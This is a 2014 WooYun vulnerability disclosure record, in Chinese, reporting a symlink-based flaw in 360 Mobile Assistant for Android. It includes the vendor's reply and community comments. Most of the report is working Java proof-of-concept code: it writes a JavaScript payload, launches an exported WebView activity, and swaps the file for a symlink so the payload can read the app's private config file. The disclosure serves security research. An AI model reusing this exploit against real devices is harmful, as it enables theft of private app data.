{"id": 4742, "wybug_id": "wooyun-2014-049252", "wybug_title": "360手机助手任意数据窃取漏洞", "wybug_corp": "奇虎360", "wybug_author": "燕子侠", "wybug_date": "2014-01-18 19:03", "wybug_open_date": "2014-04-18 19:03", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-18：\t细节向公众公开  简要描述： 据说安装量好几个亿 详细说明：  利用符号链接，可以绕过文件同源性策略的限制，调用com.qihoo.lightapp.WebAppFakeBrowserLightActivity组件解析执行特定的JavaScript脚本，可以窃取任意私有文件的内容。 具体利用可参考刚公布出来的firefox此类漏洞的利用，详细url参看: https://viaforensics.com/mobile-security/chained-vulnerabilities-firefox-android-pimp-browser.html POC如下（借鉴x3xtxt的代码):\nString sensitive_file_name = \"/data/data/com.qihoo.appstore/shared_prefs/common_config.xml\";\t\t\t\tDP_WebViewReadAnyFilePoC(sensitive_file_name);\t}\t@Override\tpublic boolean onCreateOptionsMenu(Menu menu) {\t\t// Inflate the menu; this adds items to the action bar if it is present.\t\tgetMenuInflater().inflate(R.menu.main, menu);\t\treturn true;\t}\t\tpublic void DP_WebViewReadAnyFilePoC(String targetfile){\t\ttry{\t\t\t\t\t\tString shell_poc   = \"/data/data/\"+getApplicationContext().getPackageName()+\"/files/shellpoc.html\";\t\t\t\t\t\twrite_payload_file();\t\t\tcmdexec(new String[] {\"/system/bin/chmod\", \"-R\", \"777\", shell_poc});\t\t\t\t\t\t\t\t\tString pkgName      = \"com.qihoo.appstore\";\t\t\tString activityName = \"com.qihoo.lightapp.WebAppFakeBrowserLightActivity\";\t\t\tString url          = \"file://\"+shell_poc;\t\t\t\tIntent intent = new Intent();\t\t\tintent.setAction(\"com.qihoo.light.action.WEBAPP_LINK\");\t\t\tintent.setComponent(new ComponentName(pkgName, activityName));\t\t\tintent.setData(Uri.parse(url));\t\t\tstartActivity(intent);\t\t\tThread.sleep(2000);\t\t\t\t\t\tcmdexec(new String[] {\"/system/bin/rm\", shell_poc});\t\t\tcmdexec(new String[] {\"/system/bin/ln\", \"-s\", targetfile, shell_poc});\t\t\tcmdexec(new String[] {\"/system/bin/chmod\", \"-R\", \"777\", shell_poc});\t\t\t\t\t\tThread.sleep(5000);\t\t\t\t\t\tcmdexec(new String[] {\"/system/bin/rm\", shell_poc});\t\t\t\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t}\t@SuppressWarnings(\"deprecation\")\tpublic void write_payload_file(){\t\tString payloadStr = \"function getContent(){   \\n\" +\"  var url = location.href;                           \\n\" +\"  var xmlhttp;                                       \\n\" +\"  if(window.XMLHttpRequest){                         \\n\" +\"\txmlhttp=new XMLHttpRequest();                     \\n\" +\"  }else{                                             \\n\" +\"\txmlhttp=new ActiveXObject(\\\"Microsoft.XMLHTTP\\\"); \\n\" +\"  }                                                  \\n\" +\"                                                     \\n\" + \"  xmlhttp.onreadystatechange=function()              \\n\" +\"  {                                                  \\n\" +\"\tif (xmlhttp.readyState==4)                        \\n\" +\"\t{                                                 \\n\" +\"\t  alert(xmlhttp.responseText);                    \\n\" + \"\t}                                                 \\n\" +\"  }                                                  \\n\" +\"  xmlhttp.open(\\\"GET\\\",url,true);                    \\n\" +\"  xmlhttp.send();                                    \\n\" +\"}                                                    \\n\" +\"                                                     \\n\" + \"setTimeout(getContent,4000);                         \\n\";\t\tString htmlStr = \"<html>                                             \\n\" +                 \"<head><title>Steal Sensitive Information PoC</title></head> \\n\" + \t            \"<body>                                                      \\n\" +                \"  <script type=\\\"text/javascript\\\">                         \\n\" +                       payloadStr                                                 +\t            \"  </script>                                                 \\n\" +\t            \"</body>                                                     \\n\" +\t            \"</html>\";\t\ttry{\t\t\tFileOutputStream fOut = openFileOutput(\"shellpoc.html\", Context.MODE_WORLD_READABLE);\t\t\tfOut.write(htmlStr.getBytes());\t\t\tfOut.close();\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t\t\t}\t\tpublic void cmdexec(String[] cmd){\t\ttry{\t\t\tRuntime.getRuntime().exec(cmd);\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t\t\t\t\t}\n   漏洞证明：  \n\n   修复方案：  限制符号链接   版权声明：转载请注明来源 燕子侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-01-19 20:06 厂商回复：  最新状态： 2014-01-19：感谢乌云平台和燕子侠提供的漏洞信息。这并不360手机助手的漏洞，而是Andriod原生Webview的漏洞。且只有root权限或本地存在恶意app的情况下，才可能被恶意利用。我们已经更新发布新版本进行修补，用户升级即可解决，附上新版本链接Web下载页面：http://www.360.cn/shoujizhushou/index.html wap下载页面：http://m.360.cn/zs http://m.360.cn/nwap/baohe.html文件下载链接：http://down.360safe.com/360mobilemgr/360box_web.apk  ", "replys": "漏洞评价：\n评论\n     2014-01-18 19:04 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  略吊~    \n     2014-01-18 19:29 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  360忠实用户飘过    \n     2014-01-18 19:50 |    \t\t天际 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 我只是在打酱油)\t\t \n  坐等各大新闻再次炮轰····    \n     2014-01-18 20:17 |    \t\tMr.Zhang \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 乌云上的段子手)\t\t \n  坐等    \n     2014-01-19 18:07 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  你们啊 不要想喜欢弄个大新闻 说360又有漏洞了 就把360批判一番 你们啊 naive!    \n     2014-01-19 20:34 |    \t\t燕子侠 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:8        | PK)\t\t \n  肯定是在非root情况下可以触发的啊    \n     2014-01-19 21:27 |    \t\tPentest.mobi \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:9        | 手机安全)\t\t \n  没root 说个J8    \n     2014-01-19 21:30 |    \t\tBincker \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:23        )\t\t \n  没root 说个J8    \n     2014-01-19 22:44 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  @奇虎360 什么不是360的问题还需要升级？不是你们的问题，升级了能够解决？真他妈的搞笑！    \n     2014-01-19 22:58 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  我是小白，谢谢解释。。。    \n     2014-01-20 10:03 |    \t\tPentest.mobi \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:9        | 手机安全)\t\t \n  确实是Android的漏洞，Android的碎片化太厉害了，楼主的漏洞是类似黑锅的洞吧，到4.4的安卓全用不了啦。其实Android Webview的溢出还有好几处呢，直接拿权限,都不知道这个怎么补。    \n     2014-09-01 01:13 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @Pentest.mobi 实Android Webview的溢出还有好几处呢! 在哪    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}